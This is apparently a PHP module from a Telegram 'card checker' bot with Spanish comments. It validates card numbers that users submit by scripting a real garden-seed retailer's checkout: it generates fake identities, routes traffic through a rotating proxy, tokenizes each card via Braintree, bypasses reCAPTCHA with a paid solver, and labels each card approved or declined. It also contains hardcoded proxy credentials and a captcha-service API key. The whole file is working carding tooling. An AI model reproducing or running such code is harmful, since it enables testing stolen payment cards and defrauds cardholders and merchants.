<?php

require __DIR__ . "/../Class/Capsolver/autoload.php";

$gatewayname="bra";
if (preg_match('/^[\/\.,\$](?:'.$gatewayname.')(?:\s+(.+))?$/i', $message, $matches)) {
//==================[Inicializacion de variables]======================//
$messages = $bot->loadPlantillas();
$gateway = "#Braintree_Charged (".'$4'.")";
$lang = $db->getUserLanguage($userId);
//==================[Manejo de los Usuarios]======================//
 $accessMessage = $db->verifyUserAccess($userId, $chat_id,'$'.$gatewayname);
if ($accessMessage !== null) {
$bot->callApi('sendMessage', [
    'chat_id' => $chat_id,
    'text' => $bot->translateTemplate($accessMessage, 'en', $lang),
    'parse_mode' => 'html',
    'reply_to_message_id' => $message_id,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    ])
    ]);
    return; 
    }
//==================[Mensaje configuracion y time]======================//
$lista = $bot->getCleanList($message, $replyMessageText);
$starttim = microtime(true);
//==================[REGEX]======================//
$validationResult = $bot->validateCreditCard($lista);
if (is_string($validationResult)) {
    $editmessage = $bot->callApi('SendMessage', [
        'chat_id' => $chat_id,
        'text' => $bot->translateTemplate($validationResult, 'en', $lang),
        'parse_mode' => 'html',
        'reply_to_message_id' => $message_id,
        'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true

    ])
    ]);
    sleep(3);
    $bot->callApi('deleteMessage', [
        'chat_id' => $chat_id,
        'message_id' => $editmessage 
    ]);
    return;
}

$cc = $validationResult['cc'];
$mes = $validationResult['mes'];
$ano = $validationResult['ano'];
$ano1 = (strlen($year) == 2) ? $ano : substr($ano, 2);
$cvv = $validationResult['cvv'];
$creditcard = $validationResult['creditcard'];
    //==================[Antispam]======================//
    $antispam = $db->antispamCheck($userId,$username?:$firstname);

    if($antispam != False){
        $editmessage = $bot->callApi('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>$antispam,
        'parse_mode'=>'html',
        'reply_to_message_id'=> $message_id,
        'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    
        ])
      ]);
      sleep(3);
      $bot->callApi('deleteMessage', [
          'chat_id' => $chat_id,
          'message_id' => $editmessage 
      ]);
      return;
    }
$editmessage = $bot->callApi('SendMessage', [
    'chat_id' => $chat_id,
    'text' => sprintf(
        $bot->translateTemplate($messages['vSiesta_gateway'], 'en', $lang),
$gateway,
    $creditcard),
    'parse_mode' => 'html',
    'reply_to_message_id' => $message_id,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    ])
]);
    

 //==================[Random Direcciones]======================//
    $userData = Fake::GetUser('US');

    $firstName = $userData['first_name'];
    $lastName = $userData['last_name'];
    $username1 = $userData['username'];
    $email = $userData['email'];
    $password = $userData['password'];
    $phone = $userData['phone']['format2'];
    $userAgent = $userData['userAgent'];

    $street = $userData['street'];
    $country = $userData['country'];
    $iso2 = $userData['iso2'];
    $state = $userData['state'];
    $state_id = $userData['state_id'];
    $city = $userData['city'];
    $zip = $userData['zip'];
    $lastFourDigits = substr($cc, -4);
 //==================[Bin Verificador]======================//
    $bin = substr($cc, 0, 6);
    $resultado = $bot->verificarBin($bin);

    if (!is_string($resultado)) { // Verificamos que no sea un mensaje de error
        $brand = $resultado['brand'];
        $country = $resultado['country'];
        $country_name = $resultado['country_name'];
        $country_flag = $resultado['country_flag'];
        $country_currencies = $resultado['country_currencies'];
        $bank = $resultado['bank'];
        $level = $resultado['level'];
        $type = $resultado['type'];
    } else {
        $bot->callApi('EditMessageText', [
            'chat_id' => $chat_id,
            'text' => $resultado,
            'parse_mode' => 'html',
            'message_id' => $editmessage,
         
        ]);
        exit();
    }
    
 //==================[Proxys y Cookies]======================//
 $socks5 = "gw.dataimpulse.com:823";
 $rotate = "b097452cc0d2c2bcc268:7580f00952ea0161";
 
 $cookie = uniqid();
 
 
 $proxies = ["METHOD" => "CUSTOM", "SERVER" => $socks5, "AUTH" => $rotate];

 //==================[Curl Request]======================//
 

 
 
 
 // add cart 
 $response = CurlX::Post(
     "https://www.outsidepride.com/api/cart/update",
     '{"items":[{"index":null,"product_id":19975,"variant_id":11611,"quantity":1},{"index":null,"product_id":19975,"variant_id":11612,"quantity":0},{"index":null,"product_id":16425,"variant_id":2173,"quantity":0},{"index":null,"product_id":16425,"variant_id":2174,"quantity":0},{"index":null,"product_id":16425,"variant_id":5236,"quantity":0},{"index":null,"product_id":19635,"variant_id":10892,"quantity":0},{"index":null,"product_id":19635,"variant_id":10893,"quantity":0},{"index":null,"product_id":19979,"variant_id":11619,"quantity":0},{"index":null,"product_id":19979,"variant_id":11620,"quantity":0},{"index":null,"product_id":19978,"variant_id":11617,"quantity":0},{"index":null,"product_id":19978,"variant_id":11618,"quantity":0},{"index":null,"product_id":19977,"variant_id":11615,"quantity":0},{"index":null,"product_id":19977,"variant_id":11616,"quantity":0},{"index":null,"product_id":19976,"variant_id":11613,"quantity":0},{"index":null,"product_id":19976,"variant_id":11614,"quantity":0},{"index":null,"product_id":19647,"variant_id":10933,"quantity":0},{"index":null,"product_id":19647,"variant_id":10934,"quantity":0}]}',
     [
         'Accept: application/json',
         'Accept-Language: es-ES,es;q=0.9',
         'Content-Type: application/json',
         'Origin: https://www.outsidepride.com',
         'Referer: https://www.outsidepride.com/seed/flower-seed/marigold/african-marigold-seeds-yummy-mummy.html',
         
     ],
     $cookie,
     $proxies,
      'Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).''
 );
 
 $response = CurlX::Post(
     "https://www.outsidepride.com/api/cart/update",
     '{"register":{"as_guest":true,"username":"'.$username1.'","password":"`'.$password.'`","email":"","error":""}}',
     [
         'Accept: application/json',
         'Accept-Language: es-ES,es;q=0.9',
         'Content-Type: application/json',
         'Referer: https://www.outsidepride.com/cart',
         
     ],
     $cookie,
     $proxies,
      'Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).''
 );
 
 $response = CurlX::Post(
     "https://www.outsidepride.com/api/cart/update",
     '{"account":{"billing":{"first_name":"alex","last_name":"frick","company":"","address":"'.$street.'","address2":"","city":"'.$city.'","state":"'.$state.'","countrycode":"US","postalcode":"'.$zip.'","email":"'.$email.'","phone":"'.$phone.'"},"shipping":{"name":"alex frick","company":"revenge","address":"'.$street.'","address2":"","city":"'.$city.'","state":"'.$state.'","countrycode":"US","postalcode":"'.$zip.'"}},"shipping":{"active":null,"postalcode":""}}',
     [
         'Accept: application/json',
         'Accept-Language: es-ES,es;q=0.9',
         'Content-Type: application/json',
         'Referer: https://www.outsidepride.com/cart/checkout',
         
     ],
     $cookie,
     $proxies,
      'Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).''
 );
 
 echo $signature =CurlX::ParseString($response->body,'"signature":"','"');
 
 $response = CurlX::Get(
     "https://www.outsidepride.com/api/order/state",
     [
         'Accept: application/json',
         'Accept-Language: es-ES,es;q=0.9',
         'Referer: https://www.outsidepride.com/cart/checkout',
         
     ],
     $cookie,
     $proxies,
      'Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).''
 );
  $bearer =CurlX::ParseString($response->body,'"braintree":"','"');
 
 $bearer = json_decode(base64_decode($bearer),true)["authorizationFingerprint"];
 
 
 $response = CurlX::Post(
     "https://payments.braintree-api.com/graphql",
     '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"5b3ddbd7-3c19-4191-a090-1d03d90588c3"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'","billingAddress":{"postalCode":"'.$zip.'"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}',
     [
         'accept: */*',
         'accept-language: es-ES,es;q=0.9',
         'content-type: application/json',
         'authorization: Bearer '.$bearer.'',
         'braintree-version: 2018-05-10',
         'origin: https://assets.braintreegateway.com',
         'referer: https://assets.braintreegateway.com/',
         
     ],
     $cookie,
     $proxies,
      'Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).''
 );
 $token =CurlX::ParseString($response->body,'"token":"','"');
 
 $solver = new \Capsolver\CapsolverClient('CAP-0DC8A5669BCC3BACE0A04D2AA3C14585');
// Máximo número de intentos
$maxRetries = 3;
$attempt = 0;
$recapt = null;

while ($attempt < $maxRetries) {
    try {
        $attempt++;

        echo "Intento $attempt de $maxRetries...\n";

        // Crear tarea y obtener solución
        $solution = $solver->recaptchav2(
            \Capsolver\Solvers\Token\ReCaptchaV2::TASK_PROXYLESS,
            [
                'websiteURL'    => 'https://www.outsidepride.com',
                'websiteKey'    => '6LcdZrsZAAAAAISVNkivgajU_k1P1jIKDVyCT58n',
            ]
        );
        
        

        // Verificar si hay una solución válida
        if (isset($solution["gRecaptchaResponse"])) {
            $recapt = $solution["gRecaptchaResponse"];
            echo "Captcha resuelto exitosamente: $captcha\n";
            break; // Salir del bucle si se resuelve el captcha
        } else {
            throw new Exception("No se recibió una solución válida del servidor.");
        }

    } catch (\Exception $e) {
        // Registrar el error
        error_log("Error al resolver el captcha (Intento $attempt): " . $e->getMessage());
        echo "Ocurrió un error al resolver el captcha: " . $e->getMessage() . "\n";

        // Si alcanzamos el límite de intentos, mostrar mensaje de error
        if ($attempt >= $maxRetries) {
            echo "No se pudo resolver el captcha después de $maxRetries intentos. Intente nuevamente más tarde.\n";
            $bot->callApi('EditMessageText', [
                'chat_id' => $chat_id,
                'text' => sprintf(
                    $bot->translateTemplate($messages['gateway'], 'en', $lang),
                    $gateway,
                    $creditcard,
                    $bot->translateText("Declined!❌", "en", $lang),
                    $bot->translateText("maximo de reintentos", "es", $lang)." $maxRetries",
                    "$type - $level",
                    $bank,
                    "$country_name$country_flag",
                    $starttime,
                    $username ?: $firstname
                ),
                'parse_mode' => 'html',
                'message_id' => $editmessage,
                'reply_markup' => json_encode([
                    'inline_keyboard' => $messages['buttons_gateways'],
                    'resize_keyboard' => true
             
                    ])
                ]);
            break;
        }

        // Opcional: Esperar un momento antes de reintentar
        sleep(2);
    }
}

 $response = CurlX::Post(
     "https://www.outsidepride.com/api/order/finalize",
     '{"signature":"'.$signature.'","is_gift":false,"subscribe":false,"referral":null,"payment":{"system":"braintree","nonce":"'.$token.'","recaptchaVal":"'.$recapt.'","payment_method":"credit-card","timestamp":"1727213755"},"deviceData":"{\"device_session_id\":\"ae6861a3e91b83a4b16f2e5f12229ef2\",\"fraud_merchant_id\":null,\"correlation_id\":\"b41afc3b9fe45c500ea7f98bfee3b646\"}"}',
     [
         'Accept: application/json',
         'Accept-Language: es-ES,es;q=0.9',
         'Content-Type: application/json',
         'Origin: https://www.outsidepride.com',
         'Referer: https://www.outsidepride.com/cart/checkout',
         
     ],
     $cookie,
     $proxies,
      'Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).''
 );
 
 print_r($response);

 //==================[Manejo de los mensajes]======================//

$errormessage =trim(CurlX::ParseString($response->body,'"message":"','"'));


if($errormessage=="null"){
    $errormessage = "There was a problem processing the request";
    file_put_contents(__DIR__ . "/../Responses/".str_replace(' ', '', trim($gateway)).".txt",$response->body);
} 
 //==================[Fin time]======================//
$starttime = intval(microtime(true) - $starttim);
 //==================[Manejo del bot]======================//
 if($errormessage == "Card Issuer Declined CVV"){

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText("Approved!✅", "en", $lang),
            " $errormessage",
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 elseif($errormessage == "Insufficient Funds"){

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText("Approved!✅", "en", $lang),
          " $errormessage",
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 elseif($errormessage == "Your account was created successfully"){

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText(  "Approved Auth!✅", "en", $lang),
            " $errormessage",
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 elseif($errormessage == "Gateway Rejected: avs"){

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText(  "Approved!✅", "en", $lang),
           " $errormessage",
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 else{
$bot->callApi('EditMessageText', [
    'chat_id' => $chat_id,
    'text' => sprintf(
        $bot->translateTemplate($messages['gateway'], 'en', $lang),
        $gateway,
        $creditcard,
        $bot->translateText("Declined!❌", "en", $lang),
       " $errormessage",
        "$type - $level",
        $bank,
        "$country_name$country_flag",
        $starttime,
        $username ?: $firstname
    ),
    'parse_mode' => 'html',
    'message_id' => $editmessage,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
 
        ])
    ]);
}}
